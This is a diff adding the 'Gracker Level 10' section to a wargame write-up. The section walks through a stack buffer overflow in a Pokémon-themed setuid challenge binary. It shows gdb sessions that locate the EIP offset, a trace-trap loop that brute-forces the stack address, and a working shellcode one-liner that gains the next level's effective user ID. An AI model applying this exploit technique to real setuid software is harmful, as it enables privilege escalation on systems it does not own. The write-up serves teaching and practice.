@@ -953,4 +953,279 @@ After running this command:
 I am able to access the flag!
 
 
-## More to come soon!
+# Gracker Level 10
+
+```
+    level10@gracker:/matrix/level10$ gdb level10
+    GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+    Reading symbols from level10...(no debugging symbols found)...done.
+    (gdb) set disassembly-flavor intel
+    (gdb) r
+    Starting program: /matrix/level10/level10
+                              ,               ,
+      Eevee                   \.           .'/
+           :L73               \  \ .---. .-' /
+      ┃ HP:============        '. '     `\_.'
+      ┗━━━━━━━━━━━━━━━━━━►       | 0, 0  |     ,
+                                 (  __   /   .' \
+                                .''.___.'--,/\_,|
+                               {  /     \   }   |
+                                '.\     /_.'    /
+                                 |'-.-',  `; _.'
+                                 |  |  |   |`
+          .-. \_/ .-.            `""`""`"""`
+          \.-\/=\/.-/             Kakuna
+       '-./         \.-'           :L12          ┃
+      .--|          |--.        HP:============  ┃
+     (((_)\         /(_)))            42/42      ┃
+      `\ \_`-.   .-'_/ /`_    ◄━━━━━━━━━━━━━━━━━━┛
+        '.__       __.'(_))
+            /     \     //
+           |       |__.'/
+    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
+    ┃                       ┃                    ┃
+    ┃                       ┃ 1) FIGHT   2) PkMn ┃
+    ┃                       ┃ 3) ITEM    4) RUN  ┃
+    ┃                       ┃                    ┃
+    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
+    Select: 1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    ◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+    ┃                                            ┃
+    ┃ Kakuna attacks Eevee but miss.             ┃
+    ┃ Eeve attacks Kakuna, but misses.           ┃
+    ┃                                            ┃
+    ◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Because of the loop we will not easily return from the game-loop function. That's why we have to choose RUN as an option to return, after we smashed the stack.
+
+
+                          ,               ,
+      Eevee                   \.           .'/
+           :L73               \  \ .---. .-' /
+      ┃ HP:============        '. '     `\_.'
+      ┗━━━━━━━━━━━━━━━━━━►       | 0, 0  |     ,
+                                 (  __   /   .' \
+                                .''.___.'--,/\_,|
+                               {  /     \   }   |
+                                '.\     /_.'    /
+                                 |'-.-',  `; _.'
+                                 |  |  |   |`
+          .-. \_/ .-.            `""`""`"""`
+          \.-\/=\/.-/             Kakuna
+       '-./         \.-'           :L12          ┃
+      .--|          |--.        HP:============  ┃
+     (((_)\         /(_)))            42/42      ┃
+      `\ \_`-.   .-'_/ /`_    ◄━━━━━━━━━━━━━━━━━━┛
+        '.__       __.'(_))
+            /     \     //
+           |       |__.'/
+    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
+    ┃                       ┃                    ┃
+    ┃                       ┃ 1) FIGHT   2) PkMn ┃
+    ┃                       ┃ 3) ITEM    4) RUN  ┃
+    ┃                       ┃                    ┃
+    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
+    Select: 4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    ◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+    ┃                                            ┃
+    ┃ You run away!                              ┃
+    ┃                                            ┃
+    ┃                                            ┃
+    ◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x41414141 in ?? ()
+    (gdb) info registers
+    eax            0x1e2    482
+    ecx            0xffffffff   -1
+    edx            0xf7fc9878   -134440840
+    ebx            0xf7fc8000   -134447104
+    esp            0xffffdc50   0xffffdc50
+    ebp            0x41414141   0x41414141
+    esi            0x0  0
+    edi            0x0  0
+    eip            0x41414141   0x41414141
+    eflags         0x10282  [ SF IF RF ]
+    cs             0x23 35
+    ss             0x2b 43
+    ds             0x2b 43
+    es             0x2b 43
+    fs             0x0  0
+    gs             0x63 99
+
+EIP is overwritten. So let's find the correct offset. And use the first input to smash the stack, and in the second loop we enter "4" to return:
+
+    (gdb) r
+    The program being debugged has been started already.
+    Start it from the beginning? (y or n) y
+    Starting program: /matrix/level10/level10
+                              ,               ,
+      Eevee                   \.           .'/
+           :L73               \  \ .---. .-' /
+      ┃ HP:============        '. '     `\_.'
+      ┗━━━━━━━━━━━━━━━━━━►       | 0, 0  |     ,
+                                 (  __   /   .' \
+                                .''.___.'--,/\_,|
+                               {  /     \   }   |
+                                '.\     /_.'    /
+                                 |'-.-',  `; _.'
+                                 |  |  |   |`
+          .-. \_/ .-.            `""`""`"""`
+          \.-\/=\/.-/             Kakuna
+       '-./         \.-'           :L12          ┃
+      .--|          |--.        HP:============  ┃
+     (((_)\         /(_)))            42/42      ┃
+      `\ \_`-.   .-'_/ /`_    ◄━━━━━━━━━━━━━━━━━━┛
+        '.__       __.'(_))
+            /     \     //
+           |       |__.'/
+    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
+    ┃                       ┃                    ┃
+    ┃                       ┃ 1) FIGHT   2) PkMn ┃
+    ┃                       ┃ 3) ITEM    4) RUN  ┃
+    ┃                       ┃                    ┃
+    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
+    Select: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO
+                              ,               ,
+      Eevee                   \.           .'/
+           :L73               \  \ .---. .-' /
+      ┃ HP:============        '. '     `\_.'
+      ┗━━━━━━━━━━━━━━━━━━►       | 0, 0  |     ,
+                                 (  __   /   .' \
+                                .''.___.'--,/\_,|
+                               {  /     \   }   |
+                                '.\     /_.'    /
+                                 |'-.-',  `; _.'
+                                 |  |  |   |`
+          .-. \_/ .-.            `""`""`"""`
+          \.-\/=\/.-/             Kakuna
+       '-./         \.-'           :L12          ┃
+      .--|          |--.        HP:============  ┃
+     (((_)\         /(_)))            42/42      ┃
+      `\ \_`-.   .-'_/ /`_    ◄━━━━━━━━━━━━━━━━━━┛
+        '.__       __.'(_))
+            /     \     //
+           |       |__.'/
+    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
+    ┃                       ┃                    ┃
+    ┃                       ┃ 1) FIGHT   2) PkMn ┃
+    ┃                       ┃ 3) ITEM    4) RUN  ┃
+    ┃                       ┃                    ┃
+    ◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
+    Select: 4
+    ◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+    ┃                                            ┃
+    ┃ You run away!                              ┃
+    ┃                                            ┃
+    ┃                                            ┃
+    ◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x48484848 in ?? ()
+
+0x48484848 which is "HHHH"
+
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO
+-------- offset: 28chars ---^^^^
+
+Let's have a look at the stack after the gets(). As you can see we have quite some nops in there already. But it will be difficult to hit it, because the stack moves around a lot depending on environment variables and other crap on the stack.
+
+    (gdb) x/100x 0xffffdc00
+    0xffffdc00: 0x00000000  0x00000000  0xffffdc28  0x080484a3
+    0xffffdc10: 0x08048da4  0x00000000  0xffffdc48  0x080484cf
+    0xffffdc20: 0xffffdc30  0x002c307d  0xffffdc48  0x08048510
+    0xffffdc30: 0x41410034  0x41414141  0x41414141  0x41414141
+    0xffffdc40: 0x41414141  0x41414141  0x41414141  0xffffdd00
+    0xffffdc50: 0x90909090  0x90909090  0x90909090  0x90909090
+    0xffffdc60: 0x90909090  0x90909090  0x90909090  0x90909090
+    0xffffdc70: 0x90909090  0x90909090  0x90909090  0x90909090
+    0xffffdc80: 0x90909090  0x90909090  0x90909090  0x90909090
+    0xffffdc90: 0x90909090  0x90909090  0x90909090  0x90909090
+    0xffffdca0: 0x90909090  0x90909090  0x90909090  0x90909090
+    0xffffdcb0: 0x90909090  0x90909090  0x90909090  0x90909090
+    0xffffdcc0: 0x90909090  0x90909090  0x90909090  0x90909090
+    0xffffdcd0: 0x580b6acc  0x68665299  0xe189702d  0x68686a52 << cc is trap
+    0xffffdce0: 0x7361622f  0x69622f68  0x52e3896e  0xe1895351
+    0xffffdcf0: 0x080080cd  0xf7feb130  0xffffdcfc  0x0000001c
+    0xffffdd00: 0x00000001  0xffffde2e  0x00000000  0xffffde3b
+    0xffffdd10: 0xffffde4a  0xffffde5d  0xffffde6e  0xffffde78
+
+Because we don't know exactly where the stack will be without gdb,
+we can start with one address and slowly move the stack address 0x20 upwards. Until we hit the trace trap.
+
+                                                                                 change offset
+    ...                                                                               vv
+    (python -c 'import struct; x=lambda i: struct.pack("I",i); print "A"*28+x(0xffffde00)+"\x90"*128+"\xcc"; print "4"'; echo "id") | env -i ./level10
+    (python -c 'import struct; x=lambda i: struct.pack("I",i); print "A"*28+x(0xffffde20)+"\x90"*128+"\xcc"; print "4"'; echo "id") | env -i ./level10
+    (python -c 'import struct; x=lambda i: struct.pack("I",i); print "A"*28+x(0xffffde40)+"\x90"*128+"\xcc"; print "4"'; echo "id") | env -i ./level10
+    (python -c 'import struct; x=lambda i: struct.pack("I",i); print "A"*28+x(0xffffde60)+"\x90"*128+"\xcc"; print "4"'; echo "id") | env -i ./level10
+    (python -c 'import struct; x=lambda i: struct.pack("I",i); print "A"*28+x(0xffffde80)+"\x90"*128+"\xcc"; print "4"'; echo "id") | env -i ./level10
+
+    zsh: broken pipe  ( python -c ; echo "id"; ) |
+    zsh: trace trap   env -i ./level10
+
+We hit the trace trap. Now we can place shellcode there:
+
+    level10@gracker:/matrix/level10$ (python -c 'import struct; x=lambda i: struct.pack("I",i); print "A"*28+x(0xffffde80)+"\x90"*128+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3x52\x51\x53\x89\xe1\xcd\x80"; print "4"'; cat) | env -i ./level10
+                          ,               ,
+  Eevee                   \.           .'/
+       :L73               \  \ .---. .-' /
+  ┃ HP:============        '. '     `\_.'
+  ┗━━━━━━━━━━━━━━━━━━►       | 0, 0  |     ,
+                             (  __   /   .' \
+                            .''.___.'--,/\_,|
+                           {  /     \   }   |
+                            '.\     /_.'    /
+                             |'-.-',  `; _.'
+                             |  |  |   |`
+      .-. \_/ .-.            `""`""`"""`
+      \.-\/=\/.-/             Kakuna
+   '-./         \.-'           :L12          ┃
+  .--|          |--.        HP:============  ┃
+ (((_)\         /(_)))            42/42      ┃
+  `\ \_`-.   .-'_/ /`_    ◄━━━━━━━━━━━━━━━━━━┛
+    '.__       __.'(_))
+        /     \     //
+       |       |__.'/
+◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
+┃                       ┃                    ┃
+┃                       ┃ 1) FIGHT   2) PkMn ┃
+┃                       ┃ 3) ITEM    4) RUN  ┃
+┃                       ┃                    ┃
+◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
+Select:                           ,               ,
+  Eevee                   \.           .'/
+       :L73               \  \ .---. .-' /
+  ┃ HP:============        '. '     `\_.'
+  ┗━━━━━━━━━━━━━━━━━━►       | 0, 0  |     ,
+                             (  __   /   .' \
+                            .''.___.'--,/\_,|
+                           {  /     \   }   |
+                            '.\     /_.'    /
+                             |'-.-',  `; _.'
+                             |  |  |   |`
+      .-. \_/ .-.            `""`""`"""`
+      \.-\/=\/.-/             Kakuna
+   '-./         \.-'           :L12          ┃
+  .--|          |--.        HP:============  ┃
+ (((_)\         /(_)))            42/42      ┃
+  `\ \_`-.   .-'_/ /`_    ◄━━━━━━━━━━━━━━━━━━┛
+    '.__       __.'(_))
+        /     \     //
+       |       |__.'/
+◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
+┃                       ┃                    ┃
+┃                       ┃ 1) FIGHT   2) PkMn ┃
+┃                       ┃ 3) ITEM    4) RUN  ┃
+┃                       ┃                    ┃
+◉━━━━━━━━━━━━━━━━━━━━━━━◉━━━━━━━━━━━━━━━━━━━━◉
+Select: ◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃                                            ┃
+┃ You run away!                              ┃
+┃                                            ┃
+┃                                            ┃
+◉━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+id
+uid=1010(level10) gid=1010(level10) euid=1011(level11) groups=1010(level10)
+```
